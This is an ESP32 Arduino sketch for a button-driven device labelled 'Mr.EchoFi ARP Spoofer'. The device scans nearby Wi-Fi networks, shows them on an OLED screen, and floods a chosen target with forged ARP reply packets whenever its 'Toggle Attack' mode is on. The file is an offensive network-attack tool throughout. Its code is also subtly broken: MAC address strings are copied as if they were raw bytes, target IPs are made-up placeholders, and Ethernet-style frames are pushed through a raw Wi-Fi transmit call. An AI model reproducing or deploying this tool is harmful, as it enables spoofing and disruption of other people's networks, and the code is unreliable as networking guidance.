#include <WiFi.h>
#include <esp_wifi.h>
#include <ESPAsyncWebServer.h>
#include <U8g2lib.h>

#define LED_PIN 2  // Built-in LED on ESP32
#define AUTH_PASSWORD "ARP"
#define OLED_ADDRESS 0x3C  // I2C address for the OLED

// Button pins
#define BUTTON_NEXT_PIN 17
#define BUTTON_PREV_PIN 5
#define BUTTON_SELECT_PIN 18

int packetRate = 500;  // Increased packet rate for more frequent attacks
uint8_t menuIndex = 0; // Track menu navigation
bool toggle_status = false;
int packetCount = 0;  // Packet counter for ARP attack
unsigned long prevTime = 0;

// Wi-Fi networks
String ssidList[20];
String macList[20];
String ipList[20];
int networkCount = 0;
int selectedNetwork = -1;

// Target MAC and IP (dynamic selection)
uint8_t targetMAC[6];
uint8_t targetIP[4];

// ARP packet template
uint8_t arp_packet[42] = {
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  // Destination MAC (Broadcast, updated dynamically)
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,  // Source MAC (dummy MAC, replace with actual MAC later)
  0x08, 0x06,                          // Frame type (ARP)
  0x00, 0x01,                          // Hardware type (Ethernet)
  0x08, 0x00,                          // Protocol type (IPv4)
  0x06, 0x04,                          // Hardware size, protocol size
  0x00, 0x02,                          // Opcode (2 for reply)
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06,  // Sender MAC (same as source MAC)
  0xc0, 0xa8, 0x01, 0x01,              // Sender IP (dummy IP, replace with actual IP)
  0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  // Target MAC (updated dynamically)
  0xc0, 0xa8, 0x01, 0x64               // Target IP (updated dynamically)
};

// OLED setup
U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2(U8G2_R0, /* reset=*/U8X8_PIN_NONE);

AsyncWebServer server(80);

// Function prototypes
void setupWiFi();
void drawOLEDMenu();
void handleButtonPress();
void scanWiFiNetworks();
void drawNetworkList();
void selectNetwork();
void updateARPDetails();
void parseNetworkDetails(int i);

// Send ARP packets with increased frequency for selected network
void sendARP() {
  if (toggle_status && millis() - prevTime > (1000 / packetRate)) {
    prevTime = millis();
    for (int i = 0; i < 5; i++) { // Send multiple ARP packets in quick succession
      esp_wifi_80211_tx(WIFI_IF_STA, arp_packet, sizeof(arp_packet), true);
      delay(2);  // Short delay between packets
    }
    digitalWrite(LED_PIN, HIGH);
    delay(5);
    digitalWrite(LED_PIN, LOW);
    packetCount += 5;  // Increment packet count for indicator
  }
}

// Wi-Fi setup
void setupWiFi() {
  WiFi.mode(WIFI_STA);
  scanWiFiNetworks();
}

// Update ARP packet with selected MAC and IP
void updateARPDetails() {
  // Set the ARP packet's destination MAC to targetMAC
  memcpy(arp_packet, targetMAC, 6);
  
  // Set the source MAC to the ESP's actual MAC address
  memcpy(arp_packet + 6, WiFi.macAddress().c_str(), 6);

  // Set sender MAC in ARP payload (also ESP's MAC address)
  memcpy(arp_packet + 22, WiFi.macAddress().c_str(), 6);

  // Set sender IP in ARP payload to ESP's IP address
  arp_packet[28] = WiFi.localIP()[0];
  arp_packet[29] = WiFi.localIP()[1];
  arp_packet[30] = WiFi.localIP()[2];
  arp_packet[31] = WiFi.localIP()[3];

  // Set target MAC in ARP payload
  memcpy(arp_packet + 32, targetMAC, 6);

  // Set target IP in ARP payload
  arp_packet[38] = targetIP[0];
  arp_packet[39] = targetIP[1];
  arp_packet[40] = targetIP[2];
  arp_packet[41] = targetIP[3];
}

// Wi-Fi network scan and get MAC, IP for each SSID
void scanWiFiNetworks() {
  networkCount = WiFi.scanNetworks();
  for (int i = 0; i < networkCount && i < 20; i++) {
    ssidList[i] = WiFi.SSID(i);
    parseNetworkDetails(i); // Parses MAC and IP for display and storage
  }
}

// Parse MAC and IP address of the network for display
void parseNetworkDetails(int i) {
  macList[i] = WiFi.BSSIDstr(i);  // Store the MAC address
  ipList[i] = "192.168.1." + String(100 + i);  // Dummy IPs; adjust based on network
}

// Draw network selection list with SSID, MAC, IP
void drawNetworkList() {
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_6x10_tf);
  u8g2.drawStr(10, 10, "[Select Network]");
  int displayCount = min(3, networkCount);

  for (int i = 0; i < displayCount; i++) {
    int listIndex = (menuIndex + i) % networkCount;
    String displayText = ssidList[listIndex] + " " + macList[listIndex] + " " + ipList[listIndex];
    if (i == 0) {
      u8g2.drawStr(0, 25 + i * 12, ("->> " + displayText).c_str());
    } else {
      u8g2.drawStr(1, 25 + i * 12, displayText.c_str());
    }
  }
  u8g2.sendBuffer();
}

// Draw main menu or packet counter
void drawOLEDMenu() {
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_6x10_tr);

  if (selectedNetwork == -1) {
    drawNetworkList();
  } else if (menuIndex == 0) {
    u8g2.drawStr(0, 10, "Mr.EchoFi ARP Spoofer");
    u8g2.drawStr(1, 25, "Status: ");
    u8g2.drawStr(50, 25, toggle_status ? "ON" : "OFF");
    
  } else if (menuIndex == 1) {
    u8g2.drawStr(20, 10, "|Toggle Attack|");
    u8g2.drawStr(1, 25, toggle_status ? "Press to Stop" : "Press to Start");
    u8g2.drawStr(1, 40, ("Packets Sent: " + String(packetCount)).c_str());
    u8g2.drawStr(1, 58, "More info->About<- ");
  }

  u8g2.sendBuffer();
}

// Handle button actions for selection and toggling
void handleButtonPress() {
  if (digitalRead(BUTTON_NEXT_PIN) == LOW) {
    menuIndex = (menuIndex + 1) % ((selectedNetwork == -1) ? networkCount : 2);
    delay(200);
  }

  if (digitalRead(BUTTON_PREV_PIN) == LOW) {
    if (selectedNetwork != -1 && !toggle_status) {
      selectedNetwork = -1;  // Go back to network selection if attack is stopped
      menuIndex = 0;
    } else {
      menuIndex = (menuIndex == 0) ? (selectedNetwork == -1 ? networkCount - 1 : 1) : menuIndex - 1;
    }
    delay(200);
  }

  if (digitalRead(BUTTON_SELECT_PIN) == LOW) {
    if (selectedNetwork == -1) {
      selectedNetwork = menuIndex;
      Serial.print("Selected Network: ");
      Serial.println(ssidList[selectedNetwork]);
      menuIndex = 0;

      // Set target MAC and IP for spoofing based on selected network
      sscanf(macList[selectedNetwork].c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
             &targetMAC[0], &targetMAC[1], &targetMAC[2],
             &targetMAC[3], &targetMAC[4], &targetMAC[5]);
      sscanf(ipList[selectedNetwork].c_str(), "%hhu.%hhu.%hhu.%hhu",
             &targetIP[0], &targetIP[1], &targetIP[2], &targetIP[3]);
      updateARPDetails();
      
    } else if (menuIndex == 1) {
      toggle_status = !toggle_status;
      if (!toggle_status) packetCount = 0;
    }
    delay(200);
  }
}

void setup() {
  Serial.begin(115200);
  pinMode(LED_PIN, OUTPUT);
  pinMode(BUTTON_NEXT_PIN, INPUT_PULLUP);
  pinMode(BUTTON_PREV_PIN, INPUT_PULLUP);
  pinMode(BUTTON_SELECT_PIN, INPUT_PULLUP);

  u8g2.begin();
  setupWiFi();

  // Initialize ARP packet with broadcast target
  memcpy(targetMAC, "\xff\xff\xff\xff\xff\xff", 6); // Default to broadcast
  memcpy(targetIP, "\xc0\xa8\x01\x64", 4); // Default IP for demonstration
  
  updateARPDetails();
}

void loop() {
  handleButtonPress();
  drawOLEDMenu();
  sendARP();
}
